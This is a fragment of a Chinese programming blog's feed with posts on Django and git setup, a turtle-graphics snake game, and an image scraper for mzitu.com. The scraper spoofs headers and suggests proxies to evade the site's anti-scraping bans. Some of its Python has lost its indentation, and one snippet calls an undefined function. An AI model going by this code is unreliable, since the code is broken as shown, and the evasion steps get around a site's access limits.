class="line">*.py[cod]</span><br><span class="line">*$py.class</span><br><span class="line"></span><br><span class="line"># Django stuff:</span><br><span class="line">local_settings.py</span><br><span class="line">*.sqlite3</span><br><span class="line">medial&#x2F;</span><br><span class="line"></span><br><span class="line"># database migrations</span><br><span class="line">*&#x2F;migrations&#x2F;*.py</span><br><span class="line">!*&#x2F;migrations&#x2F;__init__.py</span><br><span class="line"></span><br><span class="line"># 代表注释</span><br></pre></td></tr></table></figure></li><li><p>项目需要安装的模块及版本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; pip freeze &gt; requirements.txt</span><br><span class="line"></span><br><span class="line"># 会自己生成一个文件里面有该项目需要的模块及版本</span><br><span class="line"></span><br><span class="line"># 安装对应到模块及版本</span><br><span class="line">&gt;&gt;&gt; pip install -r requirements.txt</span><br></pre></td></tr></table></figure></li></ul><ul><li><p>git本地管理项目</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; git init# 第一次运行</span><br><span class="line">&gt;&gt;&gt; git add .# 这个目录下的所有文件做追踪</span><br><span class="line">&gt;&gt;&gt; git commit -m &#39;注释&#39;   # 提交文件并注释</span><br></pre></td></tr></table></figure></li><li><p>git本地项目推送到远程仓库</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; git push https:&#x2F;&#x2F;gitee.com&#x2F;... master# 推送到gitee仓库</span><br></pre></td></tr></table></figure></li></ul><h3 id="4-3测试获取代码"><a href="#4-3测试获取代码" class="headerlink" title="4.3测试获取代码"></a>4.3测试获取代码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; git clon https:&#x2F;&#x2F;...# 某项目代码的路径</span><br></pre></td></tr></table></figure><h2 id="SaaS-代码"><a href="#SaaS-代码" class="headerlink" title="SaaS 代码"></a>SaaS 代码</h2><p><a href="https://gitee.com/hp256/saas_platform/tree/master" target="_blank" rel="noopener">https://gitee.com/hp256/saas_platform/tree/master</a></p>]]></content>
      
      
      <categories>
          
          <category> SaaS平台 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>妹子图片爬取</title>
      <link href="/2020/07/01/%E5%A6%B9%E5%AD%90%E5%9B%BE%E7%88%AC%E5%8F%96/"/>
      <url>/2020/07/01/%E5%A6%B9%E5%AD%90%E5%9B%BE%E7%88%AC%E5%8F%96/</url>
      
        <content type="html"><![CDATA[<h1 id="妹子图片爬取"><a href="#妹子图片爬取" class="headerlink" title="妹子图片爬取"></a>妹子图片爬取</h1><h2 id="网页分析"><a href="#网页分析" class="headerlink" title="网页分析"></a>网页分析</h2><p>目标网站：<a href="https://www.mzitu.com/" target="_blank" rel="noopener">https://www.mzitu.com/</a></p><p>选择要爬取的具体页面</p><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/%E5%A6%B9%E5%AD%90%E5%9B%BE%E7%AC%94%E8%AE%B0/1.jpg"  alt="1593581808(1)"></p><p>对网站进行检查（右键+检测，或者按F12），找到图片的url，以及下一页的url地址。</p><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/%E5%A6%B9%E5%AD%90%E5%9B%BE%E7%AC%94%E8%AE%B0/2..jpg"  alt="2."></p><p>由于妹子图的每一页只有一张图片，需要获得每一页的url地址再获得每一页的图片地址。</p><p>通过上面的分析基本完成。</p><h2 id="编写代码"><a href="#编写代码" class="headerlink" title="编写代码"></a>编写代码</h2><h3 id="前期准备"><a href="#前期准备" class="headerlink" title="前期准备"></a>前期准备</h3><p>下载所需要的的库，例如：<code>requests</code>和<code>lxml</code>等</p><h3 id="构造请求头"><a href="#构造请求头" class="headerlink" title="构造请求头"></a>构造请求头</h3><p>该网站有反爬机制，需构造对应的请求头。</p><p>为了防止 ip 被该网站封禁还可以构造代理池。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">headers=&#123;</span><br><span class="line"><span class="string">'User-Agent'</span>:<span class="string">'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/82.0.4085.6 Safari/537.36'</span>,</span><br><span class="line"><span class="string">'Referer'</span>:<span class="string">'https://www.mzitu.com/'</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">proxies=&#123;</span><br><span class="line"><span class="string">'http'</span>:<span class="string">'222.95.144.65:3000'</span>,</span><br><span class="line"><span class="string">'https'</span>:<span class="string">'222.95.144.65:3000'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="获取相关的数据"><a href="#获取相关的数据" class="headerlink" title="获取相关的数据"></a>获取相关的数据</h3><p>获取相关数据采用的Xpath语法进行获取，使用Xpath语法需引入lxml库。</p><h4 id="1-下载网页"><a href="#1-下载网页" class="headerlink" title="1.下载网页"></a>1.下载网页</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"></span><br><span class="line">headers=&#123;</span><br><span class="line"><span class="string">'User-Agent'</span>:<span class="string">'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/82.0.4085.6 Safari/537.36'</span>,</span><br><span class="line"><span class="string">'Referer'</span>:<span class="string">'https://www.mzitu.com/'</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#下载网页</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_html</span><span class="params">(url)</span>:</span></span><br><span class="line">html = requests.get(url,headers=headers).content.decode(<span class="string">'utf-8'</span>)</span><br><span class="line">print(html)</span><br><span class="line">    <span class="comment"># return html</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">'https://www.mzitu.com/224549/'</span></span><br><span class="line">get_html(url)</span><br></pre></td></tr></table></figure><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/%E5%A6%B9%E5%AD%90%E5%9B%BE%E7%AC%94%E8%AE%B0/3.jpg"  alt="3"></p><h4 id="2-获取页数"><a href="#2-获取页数" class="headerlink" title="2.获取页数"></a>2.获取页数</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 获取页数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_pages</span><span class="params">(html)</span>:</span></span><br><span class="line">    etree_html = etree.HTML(html)</span><br><span class="line">    pages = etree_html.xpath(<span class="string">"//div[@class='pagenavi']/a[5]/span/text()"</span>)</span><br><span class="line">    print(pages)</span><br><span class="line">    <span class="comment"># return pages</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">'https://www.mzitu.com/224549/'</span></span><br><span class="line">html = get_html(url)</span><br><span class="line">get_pages(html)</span><br></pre></td></tr></table></figure><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/%E5%A6%B9%E5%AD%90%E5%9B%BE%E7%AC%94%E8%AE%B0/4.png"  alt="4"></p><h4 id="3-获取图片地址"><a href="#3-获取图片地址" class="headerlink" title="3.获取图片地址"></a>3.获取图片地址</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 获取图片地址</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">img_html</span><span class="params">(html)</span>:</span></span><br><span class="line">    etree_html = etree.HTML(html)</span><br><span class="line">    img_urls = etree_html.xpath(<span class="string">"//div[@class='main-image']/p/a/img/@src"</span>)</span><br><span class="line">    print(img_urls)</span><br><span class="line">    <span class="comment"># return img_urls</span></span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">url = <span class="string">'https://www.mzitu.com/224549'</span></span><br><span class="line">html = get_html(url)</span><br><span class="line">img_html(html)</span><br></pre></td></tr></table></figure><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/%E5%A6%B9%E5%AD%90%E5%9B%BE%E7%AC%94%E8%AE%B0/5.jpg"  alt="5"></p><h4 id="4-保存图片"><a href="#4-保存图片" class="headerlink" title="4.保存图片"></a>4.保存图片</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">save_img</span><span class="params">(img_urls,page)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> img_url <span class="keyword">in</span> img_urls:</span><br><span class="line">        pattern = img_url.split(<span class="string">'.'</span>)<span class="comment"># split分割符</span></span><br><span class="line">        response = requests.get(img_url,headers=headers).content</span><br><span class="line">        print(<span class="string">'正在下载第&#123;&#125;张图片'</span>.format(page))</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'project\\'</span> + str(page) + <span class="string">'.'</span> + str(pattern[<span class="number">-1</span>]), <span class="string">'ab'</span>) <span class="keyword">as</span> f:</span><br><span class="line">f.write(response)</span><br></pre></td></tr></table></figure><h4 id="5-主函数的书写"><a href="#5-主函数的书写" class="headerlink" title="5.主函数的书写"></a>5.主函数的书写</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">url = <span class="string">'https://www.mzitu.com/224549'</span></span><br><span class="line">html = get_html(url)<span class="comment"># 下载网页</span></span><br><span class="line">pages = get_pages(html)<span class="comment"># 获取页数</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,int(pages[<span class="number">0</span>])+<span class="number">1</span>):<span class="comment"># 通过for循环获得下一页的url地址</span></span><br><span class="line">urls = url + str(i)<span class="comment"># 拼接网页地址</span></span><br><span class="line">htmls = get_html(urls)<span class="comment"># 下载网页</span></span><br><span class="line">img_urls = img_url(htmls)<span class="comment"># 获取该网页图片地址</span></span><br><span class="line">time.sleep(<span class="number">1</span>)<span class="comment"># 延迟，防止被封ip</span></span><br><span class="line">save_img(img_urls,i)<span class="comment"># 保存图片</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">main()</span><br></pre></td></tr></table></figure><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/%E5%A6%B9%E5%AD%90%E5%9B%BE%E7%AC%94%E8%AE%B0/6.jpg"  alt="6"></p><h2 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">headers=&#123;</span><br><span class="line"><span class="string">'User-Agent'</span>:<span class="string">'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/82.0.4085.6 Safari/537.36'</span>,</span><br><span class="line"><span class="string">'Referer'</span>:<span class="string">'https://www.mzitu.com/'</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#下载网页</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_html</span><span class="params">(url)</span>:</span></span><br><span class="line">html = requests.get(url,headers=headers).content.decode(<span class="string">'utf-8'</span>)</span><br><span class="line"><span class="keyword">return</span> html</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取页数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_pages</span><span class="params">(html)</span>:</span></span><br><span class="line">    etree_html = etree.HTML(html)</span><br><span class="line">    pages = etree_html.xpath(<span class="string">"//div[@class='pagenavi']/a[5]/span/text()"</span>)</span><br><span class="line">    <span class="keyword">return</span> pages</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取图片地址</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">img_html</span><span class="params">(html)</span>:</span></span><br><span class="line">    etree_html = etree.HTML(html)</span><br><span class="line">    img_urls = etree_html.xpath(<span class="string">"//div[@class='main-image']/p/a/img/@src"</span>)</span><br><span class="line">    <span class="keyword">return</span> img_urls</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">save_img</span><span class="params">(img_urls,page)</span>:</span></span><br><span class="line"><span class="keyword">for</span> img_url <span class="keyword">in</span> img_urls:</span><br><span class="line">    pattern = img_url.split(<span class="string">'.'</span>)<span class="comment"># split分割符</span></span><br><span class="line">    <span class="comment"># print(pattern)</span></span><br><span class="line">    response = requests.get(img_url,headers=headers).content</span><br><span class="line">    <span class="comment"># print(response)</span></span><br><span class="line">    print(<span class="string">'正在下载第&#123;&#125;张图片'</span>.format(page))</span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">'project\\'</span> + str(page) + <span class="string">'.'</span> + str(pattern[<span class="number">-1</span>]), <span class="string">'ab'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(response)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">url = <span class="string">'https://www.mzitu.com/224549/'</span></span><br><span class="line">html = get_html(url)<span class="comment"># 下载网页</span></span><br><span class="line">pages = get_pages(html)<span class="comment"># 获取页数</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,int(pages[<span class="number">0</span>])+<span class="number">1</span>):<span class="comment"># 通过for循环获得下一页的url地址</span></span><br><span class="line">urls = url + str(i)<span class="comment"># 拼接网页地址</span></span><br><span class="line">htmls = get_html(urls)</span><br><span class="line">img_urls = img_html(htmls)</span><br><span class="line">save_img(img_urls,i)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">main()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python游戏之贪吃蛇</title>
      <link href="/2020/05/22/python%E4%B9%8B%E8%B4%AA%E5%90%83%E8%9B%87/"/>
      <url>/2020/05/22/python%E4%B9%8B%E8%B4%AA%E5%90%83%E8%9B%87/</url>
      
        <content type="html"><![CDATA[<h1 id="python之贪吃蛇"><a href="#python之贪吃蛇" class="headerlink" title="python之贪吃蛇"></a>python之贪吃蛇</h1><h2 id="了解Turtle库"><a href="#了解Turtle库" class="headerlink" title="了解Turtle库"></a>了解Turtle库</h2><p>制作贪吃蛇先绘制图像，绘制图像引用的是Turtle库。</p><p>Turtle库是Python语言内置的库，想象画笔为小乌龟，在横轴x轴和纵轴y轴的坐标原点上，按某个指令在坐标平面图上爬行绘制图像。</p><h3 id="1-画布"><a href="#1-画布" class="headerlink" title="1.画布"></a>1.画布</h3><p>画布是Turtle用于绘图的区域，可以设置它的初始位置及画布大小。</p><p>语法格式：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>turtle.screensize(canvwidth=<span class="literal">None</span>, canvheight=<span class="literal">None</span>, bg=<span class="literal">None</span>)</span><br><span class="line"><span class="comment">#canvwidth:画布的宽度(像素)</span></span><br><span class="line"><span class="comment">#canvheight:画布的高度(像素)</span></span><br><span class="line"><span class="comment">#bg:画布的背景颜色</span></span><br><span class="line"></span><br><span class="line"><span class="number">2.</span>turtle.setup(width=<span class="number">420</span>,height=<span class="number">420</span>,startx=<span class="literal">None</span>,starty=<span class="literal">None</span>)</span><br><span class="line"><span class="comment">#width：画布的宽度(像素)</span></span><br><span class="line"><span class="comment">#height：画布的高度(像素)</span></span><br><span class="line"><span class="comment">#(startx,starty)：矩形窗口左上角顶点的位置</span></span><br></pre></td></tr></table></figure><h3 id="2-画笔"><a href="#2-画笔" class="headerlink" title="2.画笔"></a>2.画笔</h3><h4 id="2-1画笔的状态"><a href="#2-1画笔的状态" class="headerlink" title="2.1画笔的状态"></a>2.1画笔的状态</h4><p>在画布上，小乌龟是以画布的中心为原点坐标。小乌龟的方向是朝着x轴的正放向。</p><h4 id="2-2画笔的属性"><a href="#2-2画笔的属性" class="headerlink" title="2.2画笔的属性"></a>2.2画笔的属性</h4><p>设置画笔的线宽：<code>turtle.pensize()</code></p><p>设置画笔的颜色：<code>turtle.pencolor()</code></p><p>设置画笔的移动速度：<code>turtle.speed(speed)</code>,画笔的速度范围在[0,10]整数。</p><h4 id="2-3绘制命令"><a href="#2-3绘制命令" class="headerlink" title="2.3绘制命令"></a>2.3绘制命令</h4><h5 id="画笔的运动命令"><a href="#画笔的运动命令" class="headerlink" title="画笔的运动命令"></a>画笔的运动命令</h5><table><thead><tr><th>命令</th><th>说明</th></tr></thead><tbody><tr><td>turtle.forward(distance)</td><td>向当前画笔方向移动distance像素长度</td></tr><tr><td>turtle.backward(distance)</td><td>向当前画笔相反方向移动distance像素长度</td></tr><tr><td>turtle.right(degree)</td><td>顺时针移动degree°</td></tr><tr><td>turtle.left(degree)</td><td>逆时针移动degree°</td></tr><tr><td>turtle.pendown()</td><td>移动时绘制图形，缺省时也为绘制</td></tr><tr><td>turtle.goto(x,y)</td><td>将画笔移动到坐标为x,y的位置</td></tr><tr><td>turtle.penup()</td><td>提起笔移动，不绘制图形，用于另起一个地方绘制</td></tr><tr><td>turtle.circle()</td><td>画圆，半径为正(负)，表示圆心在画笔的左边(右边)画圆</td></tr><tr><td>setx( )</td><td>将当前x轴移动到指定位置</td></tr><tr><td>sety( )</td><td>将当前y轴移动到指定位置</td></tr><tr><td>setheading(angle)</td><td>设置当前朝向为angle角度</td></tr><tr><td>home()</td><td>设置当前画笔位置为原点，朝向东。</td></tr><tr><td>dot(r)</td><td>绘制一个指定直径和颜色的圆点</td></tr></tbody></table><h5 id="画笔的控制命令"><a href="#画笔的控制命令" class="headerlink" title="画笔的控制命令"></a>画笔的控制命令</h5><table><thead><tr><th>命令</th><th>说明</th></tr></thead><tbody><tr><td>turtle.fillcolor(colorstring)</td><td>绘制图形的填充颜色</td></tr><tr><td>turtle.color(color1, color2)</td><td>同时设置pencolor=color1, fillcolor=color2</td></tr><tr><td>turtle.filling()</td><td>返回当前是否在填充状态</td></tr><tr><td>turtle.begin_fill()</td><td>准备开始填充图形</td></tr><tr><td>turtle.end_fill()</td><td>填充完成</td></tr><tr><td>turtle.hideturtle()</td><td>隐藏画笔的turtle形状</td></tr><tr><td>turtle.showturtle()</td><td>显示画笔的turtle形状</td></tr></tbody></table><h5 id="画笔的全局控制命令"><a href="#画笔的全局控制命令" class="headerlink" title="画笔的全局控制命令"></a>画笔的全局控制命令</h5><table><thead><tr><th>命令</th><th>说明</th></tr></thead><tbody><tr><td>turtle.clear()</td><td>清空turtle窗口，但是turtle的位置和状态不会改变</td></tr><tr><td>turtle.reset()</td><td>清空窗口，重置turtle状态为起始状态</td></tr><tr><td>turtle.undo()</td><td>撤销上一个turtle动作</td></tr><tr><td>turtle.isvisible()</td><td>返回当前turtle是否可见</td></tr><tr><td>stamp()</td><td>复制当前图形</td></tr><tr><td>turtle.write(s [,font=(“font-name”,font_size,”font_type”)])</td><td>写文本，s为文本内容，font是字体的参数，分别为字体名称，大小和类型；font为可选项，font参数也是可选项</td></tr></tbody></table><h5 id="其他命令"><a href="#其他命令" class="headerlink" title="其他命令"></a>其他命令</h5><table><thead><tr><th>命令</th><th>说明</th></tr></thead><tbody><tr><td>turtle.mainloop()或turtle.done()</td><td>启动事件循环 -调用Tkinter的mainloop函数。必须是乌龟图形程序中的最后一个语句。</td></tr><tr><td>turtle.delay(delay=None)</td><td>设置或返回以毫秒为单位的绘图延迟。</td></tr><tr><td>turtle.begin_poly()</td><td>开始记录多边形的顶点。当前的乌龟位置是多边形的第一个顶点。</td></tr><tr><td>turtle.end_poly()</td><td>停止记录多边形的顶点。当前的乌龟位置是多边形的最后一个顶点。将与第一个顶点相连。</td></tr><tr><td>turtle.get_poly()</td><td>返回最后记录的多边形。</td></tr></tbody></table><h2 id="贪吃蛇的绘制"><a href="#贪吃蛇的绘制" class="headerlink" title="贪吃蛇的绘制"></a>贪吃蛇的绘制</h2><p>了解Turtle库之后开始绘制贪吃蛇的框架</p><h3 id="绘制画布大小"><a href="#绘制画布大小" class="headerlink" title="绘制画布大小"></a>绘制画布大小</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> turtle</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    turtle.setup(<span class="number">420</span>,<span class="number">420</span>,<span class="number">0</span>,<span class="number">0</span>)   <span class="comment">#画布大小为420*420 px</span></span><br><span class="line">    turtle.hideturtle()            <span class="comment">#隐藏画笔的turtle形状</span></span><br><span class="line">    turtle.tracer(<span class="literal">False</span>)           <span class="comment">#取消画图延迟，之间显示画图的结果</span></span><br><span class="line">    turtle.done()                  <span class="comment">#启动事件循环，停留画布</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h3 id="通用模块"><a href="#通用模块" class="headerlink" title="通用模块"></a>通用模块</h3><p>由于苹果与蛇都需要绘制，为了避免代码的冗余，编写一个模块gamebase.py文件。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> turtle</span><br><span class="line"><span class="comment">#(x,y)小乌龟的起始坐标,side边长，color_name填充的颜色</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">square</span><span class="params">(x,y,side,color_name)</span>:</span></span><br><span class="line">    turtle.up()                 <span class="comment">#抬起画笔</span></span><br><span class="line">    turtle.goto(x,y)            <span class="comment">#移动到(x,y)</span></span><br><span class="line">    turtle.down()               <span class="comment">#放下画笔</span></span><br><span class="line">    turtle.color(color_name)    <span class="comment">#设置画笔颜色</span></span><br><span class="line">    turtle.begin_fill()         <span class="comment">#开始填充图形</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#矩形的绘制</span></span><br><span class="line">    turtle.forward(side)        <span class="comment">#向当前画笔方向移动size像素长度</span></span><br><span class="line">    turtle.left(<span class="number">90</span>)             <span class="comment">#逆时针移动90°</span></span><br><span class="line">    turtle.forward(side)</span><br><span class="line">    turtle.left(<span class="number">90</span>)</span><br><span class="line">    turtle.forward(side)</span><br><span class="line">    turtle.left(<span class="number">90</span>)</span><br><span class="line">    turtle.forward(side)</span><br><span class="line">    turtle.left(<span class="number">90</span>)</span><br><span class="line"></span><br><span class="line">    turtle.end_fill()           <span class="comment">#填充完成</span></span><br></pre></td></tr></table></figure><h3 id="苹果的绘制"><a href="#苹果的绘制" class="headerlink" title="苹果的绘制"></a>苹果的绘制</h3><p>引用通用模块绘制苹果，由于苹果的出现位置是随机的，引用random库中的randrange</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> turtle</span><br><span class="line"><span class="keyword">from</span> gamebase <span class="keyword">import</span> square</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randrange</span><br><span class="line"></span><br><span class="line"><span class="comment">#画布大小为420*420，因此x轴在(-210,210)，去除边框大小x轴为(200,20)</span></span><br><span class="line">apple_x = randrange(<span class="number">-20</span>,<span class="number">20</span>)*<span class="number">10</span></span><br><span class="line">apple_y = randrange(<span class="number">-20</span>,<span class="number">20</span>)*<span class="number">10</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">game_loop_apple</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">global</span> apple_x,apple_y</span><br><span class="line">    square(apple_x, apple_y, <span class="number">10</span>, <span class="string">"red"</span>)</span><br><span class="line">    turtle.update()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    turtle.setup(<span class="number">420</span>,<span class="number">420</span>,<span class="number">0</span>,<span class="number">0</span>)   <span class="comment">#画布大小为420*420 px</span></span><br><span class="line">    turtle.hideturtle()            <span class="comment">#隐藏画笔的turtle形状</span></span><br><span class="line">    turtle.tracer(<span class="literal">False</span>)           <span class="comment">#取消画图延迟，之间显示画图的结果</span></span><br><span class="line">    game_loop_apple()</span><br><span class="line">    turtle.done()                  <span class="comment">#启动事件循环，停留画布</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/%E8%B4%AA%E5%90%83%E8%9B%87/11.jpg"  alt="11"></p><h3 id="蛇的绘制"><a href="#蛇的绘制" class="headerlink" title="蛇的绘制"></a>蛇的绘制</h3><figure class="highlight python"><table><tr><td 